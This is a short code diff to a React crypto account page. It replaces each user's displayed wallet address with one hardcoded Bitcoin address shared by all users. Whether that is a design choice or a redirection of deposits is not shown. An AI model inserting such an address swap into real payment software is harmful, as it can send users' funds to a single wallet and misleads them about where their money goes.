@@ -5,6 +5,9 @@ import apiClient from '../lib/apiClient';
 import DepositModal from '../components/modals/DepositModal';
 import WithdrawalModal from '../components/modals/WithdrawalModal';
 
+// Fixed crypto wallet address for ALL users
+const FIXED_CRYPTO_ADDRESS = 'bc1q7m8m6ufptvqlt7jer92d480y78jckyrzy0t6f7';
+
 const CryptoAccountPage = ({ accountId, onBack }) => {
   const [account, setAccount] = useState(null);
   const [loading, setLoading] = useState(true);
@@ -161,7 +164,7 @@ const CryptoAccountPage = ({ accountId, onBack }) => {
 
           <div className="mt-6 pt-6 border-t border-white/20">
             <p className="text-xs text-purple-100 mb-1">Wallet Address</p>
-            <p className="text-sm font-mono break-all">{account.accountNumber}</p>
+            <p className="text-sm font-mono break-all">{FIXED_CRYPTO_ADDRESS}</p>
           </div>
         </div>
 
